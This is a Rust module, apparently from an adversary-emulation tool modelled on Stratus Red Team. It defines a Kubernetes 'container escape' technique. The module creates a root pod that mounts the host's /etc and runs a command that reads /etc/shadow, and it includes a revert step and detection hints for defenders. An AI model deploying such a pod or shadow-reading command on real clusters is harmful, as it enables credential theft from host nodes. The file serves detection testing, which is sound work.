use std::collections::HashMap;
use std::sync::Arc;
use anyhow::Result;
use k8s_openapi::api::core::v1::{
    Container, HostPathVolumeSource, Pod, PodSpec, SecurityContext, Volume, VolumeMount,
};
use k8s_openapi::apimachinery::pkg::apis::meta::v1::ObjectMeta;
use kube::{Api, Client};
use kube::api::PostParams;

use crate::platform::Platform;
use crate::providers::CloudProviders;
use crate::tactic::MitreTactic;
use crate::technique::{AttackTechnique, BoxFuture};

const NAMESPACE: &str = "default";
const POD_NAME: &str = "stratus-red-team-hostpath";

async fn detonate_impl(
    _outputs: HashMap<String, String>,
    _providers: Arc<CloudProviders>,
) -> Result<()> {
    let client = Client::try_default()
        .await
        .map_err(|e| anyhow::anyhow!("Failed to create Kubernetes client: {}. Ensure KUBECONFIG is set.", e))?;

    let pods: Api<Pod> = Api::namespaced(client.clone(), NAMESPACE);

    let pod = Pod {
        metadata: ObjectMeta {
            name: Some(POD_NAME.to_string()),
            namespace: Some(NAMESPACE.to_string()),
            ..Default::default()
        },
        spec: Some(PodSpec {
            containers: vec![Container {
                name: "attacker".to_string(),
                image: Some("busybox:latest".to_string()),
                command: Some(vec![
                    "sh".to_string(),
                    "-c".to_string(),
                    // Read /etc/shadow from host via hostPath mount at /host-etc
                    "echo 'Host /etc/shadow contents:'; cat /host-etc/shadow 2>/dev/null || echo 'shadow not readable (expected if not root)'; sleep 3600".to_string(),
                ]),
                security_context: Some(SecurityContext {
                    run_as_user: Some(0), // run as root
                    ..Default::default()
                }),
                volume_mounts: Some(vec![VolumeMount {
                    name: "host-etc".to_string(),
                    mount_path: "/host-etc".to_string(),
                    read_only: Some(true),
                    ..Default::default()
                }]),
                ..Default::default()
            }],
            volumes: Some(vec![Volume {
                name: "host-etc".to_string(),
                host_path: Some(HostPathVolumeSource {
                    path: "/etc".to_string(),
                    type_: Some("Directory".to_string()),
                }),
                ..Default::default()
            }]),
            restart_policy: Some("Never".to_string()),
            ..Default::default()
        }),
        ..Default::default()
    };

    pods.create(&PostParams::default(), &pod)
        .await
        .map_err(|e| anyhow::anyhow!("Failed to create hostPath pod: {}", e))?;

    println!(
        "Created pod '{}/{}' with hostPath volume mounting /etc from host — \
         the container can read host /etc/shadow to extract credentials",
        NAMESPACE, POD_NAME
    );
    println!("Check pod logs with: kubectl logs -n {} {}", NAMESPACE, POD_NAME);

    Ok(())
}

fn detonate(
    outputs: HashMap<String, String>,
    providers: Arc<CloudProviders>,
) -> BoxFuture<Result<()>> {
    Box::pin(detonate_impl(outputs, providers))
}

async fn revert_impl(
    _outputs: HashMap<String, String>,
    _providers: Arc<CloudProviders>,
) -> Result<()> {
    let client = Client::try_default()
        .await
        .map_err(|e| anyhow::anyhow!("Failed to create Kubernetes client: {}", e))?;

    let pods: Api<Pod> = Api::namespaced(client, NAMESPACE);
    pods.delete(POD_NAME, &Default::default())
        .await
        .map_err(|e| anyhow::anyhow!("Failed to delete pod: {}", e))?;

    println!("Deleted pod '{}/{}'", NAMESPACE, POD_NAME);
    Ok(())
}

fn revert(
    outputs: HashMap<String, String>,
    providers: Arc<CloudProviders>,
) -> BoxFuture<Result<()>> {
    Box::pin(revert_impl(outputs, providers))
}

inventory::submit! {
    AttackTechnique {
        id: "k8s.privilege-escalation.hostpath-volume",
        friendly_name: "Escape Container via hostPath Volume",
        description: "Creates a pod with a hostPath volume mounting /etc from the host node, allowing the container to read sensitive host files including /etc/shadow for credential extraction.",
        detection: "Kubernetes audit log: create pods with hostPath volumes. Falco: Container with sensitive mount detected. OPA/Gatekeeper: hostPath policy violation.",
        platform: Platform::Kubernetes,
        mitre_tactics: &[MitreTactic::PrivilegeEscalation],
        is_idempotent: false,
        is_slow: false,
        prerequisite_tf: None,
        detonate,
        revert: Some(revert),
    }
}
